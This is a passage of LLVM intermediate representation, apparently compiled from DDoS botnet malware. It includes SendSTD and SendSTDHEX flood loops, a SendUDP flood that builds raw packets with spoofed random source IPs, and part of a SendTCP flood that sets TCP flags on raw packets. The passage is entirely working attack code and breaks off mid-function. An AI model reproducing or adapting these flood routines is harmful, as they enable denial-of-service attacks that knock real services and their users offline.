  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #5
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %59, %3
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @SendSTDHEX.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %44 = bitcast i8** %43 to i8*
  %45 = call i64 @send(i32 %42, i8* %44, i64 1460, i32 0)
  %46 = load i32, i32* %7, align 4
  %47 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = call i64 @time(i64* null) #5
  %50 = load i64, i64* %8, align 8
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = add nsw i64 %50, %52
  %54 = icmp sge i64 %49, %53
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %41
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @close(i32 %56)
  call void @_exit(i32 0) #11
  unreachable

; <label>:58:                                     ; preds = %41
  store i32 0, i32* %11, align 4
  br label %59

; <label>:59:                                     ; preds = %58, %37
  %60 = load i32, i32* %11, align 4
  %61 = add i32 %60, 1
  store i32 %61, i32* %11, align 4
  br label %37
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %64, %3
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 69, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #11
  unreachable

; <label>:63:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %64

; <label>:64:                                     ; preds = %63, %38
  %65 = load i32, i32* %11, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %206

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %206

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %206

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %61, %56
  %58 = load i32, i32* %17, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %17, align 4
  %60 = icmp ne i32 %58, 0
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %57
  %62 = call i64 @time(i64* null) #5
  %63 = call i32 @rand_cmwc()
  %64 = zext i32 %63 to i64
  %65 = xor i64 %62, %64
  %66 = trunc i64 %65 to i32
  call void @srand(i32 %66) #5
  %67 = call i32 @rand() #5
  call void @init_rand(i32 %67)
  br label %57

; <label>:68:                                     ; preds = %57
  %69 = load i32, i32* %12, align 4
  %70 = sub nsw i32 32, %69
  %71 = shl i32 1, %70
  %72 = sub nsw i32 %71, 1
  %73 = xor i32 %72, -1
  store i32 %73, i32* %18, align 4
  %74 = load i32, i32* %10, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 28, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %19, align 8
  %78 = alloca i8, i64 %76, align 16
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %20, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.udphdr*
  store %struct.udphdr* %83, %struct.udphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %18, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 8, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 17, i32 %94)
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 8, %96
  %98 = trunc i64 %97 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #10
  %100 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %101 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %100, i32 0, i32 0
  %102 = bitcast %union.anon.1* %101 to %struct.anon.2*
  %103 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %102, i32 0, i32 2
  store i16 %99, i16* %103, align 2
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %107 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.1* %107 to %struct.anon.2*
  %109 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %108, i32 0, i32 0
  store i16 %105, i16* %109, align 2
  %110 = load i32, i32* %8, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %114

; <label>:112:                                    ; preds = %68
  %113 = call i32 @rand_cmwc()
  br label %119

; <label>:114:                                    ; preds = %68
  %115 = load i32, i32* %8, align 4
  %116 = trunc i32 %115 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #10
  %118 = zext i16 %117 to i32
  br label %119

; <label>:119:                                    ; preds = %114, %112
  %120 = phi i32 [ %113, %112 ], [ %118, %114 ]
  %121 = trunc i32 %120 to i16
  %122 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %123 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.1* %123 to %struct.anon.2*
  %125 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %124, i32 0, i32 1
  store i16 %121, i16* %125, align 2
  %126 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %127 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.1* %127 to %struct.anon.2*
  %129 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %128, i32 0, i32 3
  store i16 0, i16* %129, align 2
  %130 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %131 = bitcast %struct.udphdr* %130 to i8*
  %132 = getelementptr inbounds i8, i8* %131, i64 8
  %133 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %132, i32 %133)
  %134 = bitcast i8* %78 to i16*
  %135 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  %137 = load i16, i16* %136, align 2
  %138 = zext i16 %137 to i32
  %139 = call zeroext i16 @csum(i16* %134, i32 %138)
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 7
  store i16 %139, i16* %141, align 2
  %142 = call i64 @time(i64* null) #5
  %143 = load i32, i32* %9, align 4
  %144 = sext i32 %143 to i64
  %145 = add nsw i64 %142, %144
  %146 = trunc i64 %145 to i32
  store i32 %146, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %147

; <label>:147:                                    ; preds = %201, %200, %119
  br label %148

; <label>:148:                                    ; preds = %147
  %149 = load i32, i32* %15, align 4
  %150 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %151 = call i64 @sendto(i32 %149, i8* %78, i64 %76, i32 0, %struct.sockaddr* %150, i32 16)
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.1* %155 to %struct.anon.2*
  %157 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %156, i32 0, i32 0
  store i16 %153, i16* %157, align 2
  %158 = load i32, i32* %8, align 4
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %148
  %161 = call i32 @rand_cmwc()
  br label %167

; <label>:162:                                    ; preds = %148
  %163 = load i32, i32* %8, align 4
  %164 = trunc i32 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #10
  %166 = zext i16 %165 to i32
  br label %167

; <label>:167:                                    ; preds = %162, %160
  %168 = phi i32 [ %161, %160 ], [ %166, %162 ]
  %169 = trunc i32 %168 to i16
  %170 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon.1* %171 to %struct.anon.2*
  %173 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %172, i32 0, i32 1
  store i16 %169, i16* %173, align 2
  %174 = call i32 @rand_cmwc()
  %175 = trunc i32 %174 to i16
  %176 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load i32, i32* %18, align 4
  %179 = call i32 @getRandomIP(i32 %178)
  %180 = call i32 @htonl(i32 %179) #10
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = bitcast i8* %78 to i16*
  %184 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 2
  %186 = load i16, i16* %185, align 2
  %187 = zext i16 %186 to i32
  %188 = call zeroext i16 @csum(i16* %183, i32 %187)
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 7
  store i16 %188, i16* %190, align 2
  %191 = load i32, i32* %23, align 4
  %192 = load i32, i32* %14, align 4
  %193 = icmp eq i32 %191, %192
  br i1 %193, label %194, label %201

; <label>:194:                                    ; preds = %167
  %195 = call i64 @time(i64* null) #5
  %196 = load i32, i32* %22, align 4
  %197 = sext i32 %196 to i64
  %198 = icmp sgt i64 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %194
  br label %204

; <label>:200:                                    ; preds = %194
  store i32 0, i32* %23, align 4
  br label %147

; <label>:201:                                    ; preds = %167
  %202 = load i32, i32* %23, align 4
  %203 = add i32 %202, 1
  store i32 %203, i32* %23, align 4
  br label %147

; <label>:204:                                    ; preds = %199
  %205 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %205)
  br label %206

; <label>:206:                                    ; preds = %204, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %335

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %335

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %335

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %68

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub nsw i32 32, %63
  %65 = shl i32 1, %64
  %66 = sub nsw i32 %65, 1
  %67 = xor i32 %66, -1
  store i32 %67, i32* %19, align 4
  br label %68

; <label>:68:                                     ; preds = %62, %61
  %69 = load i32, i32* %12, align 4
  %70 = sext i32 %69 to i64
  %71 = add i64 40, %70
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %20, align 8
  %73 = alloca i8, i64 %71, align 16
  %74 = bitcast i8* %73 to %struct.iphdr*
  store %struct.iphdr* %74, %struct.iphdr** %21, align 8
  %75 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %76 = bitcast %struct.iphdr* %75 to i8*
  %77 = getelementptr i8, i8* %76, i64 20
  %78 = bitcast i8* %77 to %struct.tcphdr*
  store %struct.tcphdr* %78, %struct.tcphdr** %22, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %81 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = load i32, i32* %19, align 4
  %84 = call i32 @getRandomIP(i32 %83)
  %85 = call i32 @htonl(i32 %84) #10
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = add i64 20, %87
  %89 = trunc i64 %88 to i32
  call void @makeIPPacket(%struct.iphdr* %79, i32 %82, i32 %85, i8 zeroext 6, i32 %89)
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %93 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %92, i32 0, i32 0
  %94 = bitcast %union.anon* %93 to %struct.anon.0*
  %95 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %94, i32 0, i32 0
  store i16 %91, i16* %95, align 4
  %96 = call i32 @rand_cmwc()
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 2
  store i32 %96, i32* %100, align 4
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon* %102 to %struct.anon.0*
  %104 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %103, i32 0, i32 3
  store i32 0, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon* %106 to %struct.anon.0*
  %108 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %107, i32 0, i32 4
  %109 = load i16, i16* %108, align 4
  %110 = and i16 %109, -241
  %111 = or i16 %110, 80
  store i16 %111, i16* %108, align 4
  %112 = load i8*, i8** %11, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #9
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %151, label %115

; <label>:115:                                    ; preds = %68
  %116 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon* %117 to %struct.anon.0*
  %119 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = and i16 %120, -513
  %122 = or i16 %121, 512
  store i16 %122, i16* %119, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon* %124 to %struct.anon.0*
  %126 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %125, i32 0, i32 4
  %127 = load i16, i16* %126, align 4
  %128 = and i16 %127, -1025
  %129 = or i16 %128, 1024
  store i16 %129, i16* %126, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon* %131 to %struct.anon.0*
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -257
  %136 = or i16 %135, 256
  store i16 %136, i16* %133, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon* %138 to %struct.anon.0*
  %140 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %139, i32 0, i32 4
  %141 = load i16, i16* %140, align 4
  %142 = and i16 %141, -4097
  %143 = or i16 %142, 4096
  store i16 %143, i16* %140, align 4
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon* %145 to %struct.anon.0*
  %147 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %146, i32 0, i32 4
  %148 = load i16, i16* %147, align 4
  %149 = and i16 %148, -2049
  %150 = or i16 %149, 2048
  store i16 %150, i16* %147, align 4
  br label %225

; <label>:151:                                    ; preds = %68
  %152 = load i8*, i8** %11, align 8
  %153 = call i8* @strtok(i8* %152, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0)) #5
  store i8* %153, i8** %23, align 8
  br label %154

; <label>:154:                                    ; preds = %222, %151
  %155 = load i8*, i8** %23, align 8
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %224

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %23, align 8
  %159 = call i32 @strcmp(i8* %158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.104, i32 0, i32 0)) #9
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %169, label %161

; <label>:161:                                    ; preds = %157
  %162 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon* %163 to %struct.anon.0*
  %165 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %164, i32 0, i32 4
  %166 = load i16, i16* %165, align 4
  %167 = and i16 %166, -513
  %168 = or i16 %167, 512
  store i16 %168, i16* %165, align 4
  br label %222

; <label>:169:                                    ; preds = %157
  %170 = load i8*, i8** %23, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #9
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %181, label %173

; <label>:173:                                    ; preds = %169
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon* %175 to %struct.anon.0*
